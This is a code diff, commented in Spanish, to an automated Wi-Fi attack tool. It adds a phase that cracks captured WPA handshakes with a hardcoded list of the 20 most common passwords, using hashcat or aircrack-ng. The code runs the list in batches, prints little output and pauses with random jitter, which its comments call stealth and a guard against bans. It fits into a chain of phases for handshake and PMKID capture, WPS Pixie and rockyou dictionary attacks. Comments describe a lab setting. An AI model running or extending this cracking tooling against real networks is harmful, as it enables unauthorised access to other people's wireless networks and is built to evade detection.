@@ -10,6 +10,7 @@ No hay interacción del usuario durante la ejecución.
 Todo se decide antes de tocar el aire.
 """
 
+import random
 import time
 import os
 import glob
@@ -29,12 +30,23 @@ from .terminal import (
 )
 from .reporter import Reporter
 
+# 20 claves por error humano más comunes (WPA ≥8): probadas PRIMERO
+# y en sigilo; si alguna acierta se omiten WPS/diccionarios (omisión de
+# trabajo). Orden por prevalencia observada en laboratorio.
+DEFAULT_TOP20: List[str] = [
+    "12345678", "password", "123456789", "qwerty123", "1234567890",
+    "admin1234", "wifi1234", "87654321", "00000000", "11111111",
+    "12341234", "password1", "abc12345", "password123", "qwertyuiop",
+    "12344321", "adminadmin", "internet123", "cisco123", "wifi12345",
+]
+
 # ── Timeouts por fase (segundos) ─────────────────────────────────────────────
 TIMEOUTS: Dict[str, int] = {
     "CAPTURE_HANDSHAKE": 120,
     "CAPTURE_PMKID":     60,
     "WPS_CLASS":         180,
     "WPS_PIXIE":         120,
+    "PSK_DEFAULTS":      60,
     "PSK_SSID_LOGIC":    300,
     "PSK_ROCKYOU":       900,
     "MGMT_AUDIT":        60,
@@ -49,6 +61,7 @@ MAX_ATTEMPTS: Dict[str, int] = {
     "CAPTURE_PMKID":     2,
     "WPS_CLASS":         1,
     "WPS_PIXIE":         1,
+    "PSK_DEFAULTS":      1,
     "PSK_SSID_LOGIC":    2,
     "PSK_ROCKYOU":       1,
 }
@@ -56,7 +69,7 @@ MAX_ATTEMPTS: Dict[str, int] = {
 # Fases de ataque: una vez crackeado se omiten (wifite2 para la batería).
 ATTACK_PHASES = {
     "CAPTURE_PMKID", "CAPTURE_HANDSHAKE", "WPS_CLASS", "WPS_PIXIE",
-    "PSK_SSID_LOGIC", "PSK_ROCKYOU", "CLASSIFY_WEAK_CRYPTO",
+    "PSK_DEFAULTS", "PSK_SSID_LOGIC", "PSK_ROCKYOU", "CLASSIFY_WEAK_CRYPTO",
 }
 
 # Salidas de reaver/bully que indican lockout o rate-limit del AP.
@@ -736,6 +749,82 @@ def _phase_psk_ssid_logic(
     return r, None, None
 
 
+def _phase_psk_defaults(target: TargetInfo, run_dir: str) -> tuple[str, Optional[str], Optional[str]]:
+    """Fast-pass sigiloso Top-20: 20 claves por error humano más comunes.
+
+    Comportamiento (petición laboratorio):
+      - Silencioso: una sola línea dim, sin barra ruidosa ni eco por clave.
+      - Buen comportamiento: 2 lotes ×10 con pausa 2-4s + jitter entre lotes
+        (evita patrón agresivo / baneo si el backend fuese online en futuro,
+        y aun en offline disciplina el ritmo).
+      - Omisión: si acierta, el orquestador omite WPS/SSID/rockyou (misma
+        batería que PSK al ser parte de ATTACK_PHASES).
+      - Trazable: escribe defaults_top20.txt en evidence/.
+    """
+    wl = os.path.join(run_dir, "defaults_top20.txt")
+    try:
+        with open(wl, "w") as f:
+            f.write("\n".join(DEFAULT_TOP20))
+    except OSError:
+        pass
+    console.print(f"  [dim]Top-20 defaults · {target.ssid} (sigiloso: 2×10, pausa con jitter; omite resto si acierta)[/dim]")
+
+    hash_path = _ensure_hc22000(run_dir, target.bssid) or os.path.join(run_dir, "handshake.hc22000")
+    has_hash = os.path.isfile(hash_path) and os.path.getsize(hash_path) > 0
+    cap = _aircrack_cap(run_dir) if _tool_available("aircrack-ng") else None
+
+    if not has_hash and not cap:
+        return "skipped", None, None
+
+    # 2 lotes ×10 para poder pausar con jitter sin perder material si el
+    # primer lote ya contiene la clave (omisión inmediata).
+    batches = [DEFAULT_TOP20[:10], DEFAULT_TOP20[10:]]
+    last = "exhausted"
+    for idx, batch in enumerate(batches, 1):
+        batch_path = os.path.join(run_dir, f"defaults_top20_batch{idx}.txt")
+        try:
+            with open(batch_path, "w") as f:
+                f.write("\n".join(batch))
+        except OSError:
+            pass
+
+        if _tool_available("hashcat") and has_hash:
+            # Sigiloso: --quiet, sin --status, sin desc → sin barra ruidosa.
+            result = _run_tool(
+                ["hashcat", "-m", "22000", hash_path, batch_path, "--quiet"],
+                timeout=30, desc=None,
+            )
+            if result["timed_out"]:
+                _save_stderr(run_dir, f"defaults_b{idx}", result)
+                return "timeout", None, None
+            if result["returncode"] == 0:
+                key = _extract_hashcat_key(hash_path) or batch[0]
+                return "cracked", key, "WPA2-PSK (Top-20 defaults)"
+            last = "exhausted" if result["returncode"] != 0 else "not_found"
+            if result["returncode"] not in (0, 1):
+                _save_stderr(run_dir, f"defaults_b{idx}", result)
+        elif cap:
+            r, key = _crack_with_aircrack(
+                cap, batch_path, target.bssid, timeout=30, desc=None,
+            )
+            if r == "cracked":
+                return "cracked", key, "WPA2-PSK (Top-20 defaults, aircrack-ng)"
+            if r == "timeout":
+                return "timeout", None, None
+            last = r
+        else:
+            return "skipped", None, None
+
+        if idx < len(batches):
+            # Pausa 2-4s + jitter 0-1s entre lotes (sigilo / anti-baneo).
+            jitter = random.uniform(0, 1.0)
+            pause = 2.0 + random.uniform(0, 2.0) + jitter
+            console.print(f"  [dim]pausa sigilosa {pause:.1f}s antes del lote {idx+1}/2[/dim]")
+            time.sleep(pause)
+
+    return last, None, None
+
+
 def _phase_psk_rockyou(target: TargetInfo, run_dir: str) -> tuple[str, Optional[str], Optional[str]]:
     """Ataca PSK con rockyou.txt (del sistema o del bundle offline)."""
     from .wordlists import find_rockyou
@@ -948,6 +1037,9 @@ def run_single_target(
 
             elif phase == "WPS_PIXIE":
                 r, key_val, type_val = _phase_wps_pixie(target, iface, run_dir)
+
+            elif phase == "PSK_DEFAULTS":
+                r, key_val, type_val = _phase_psk_defaults(target, run_dir)
 
             elif phase == "PSK_SSID_LOGIC":
                 r, key_val, type_val = _phase_psk_ssid_logic(target, run_dir, family_keys=known_keys)
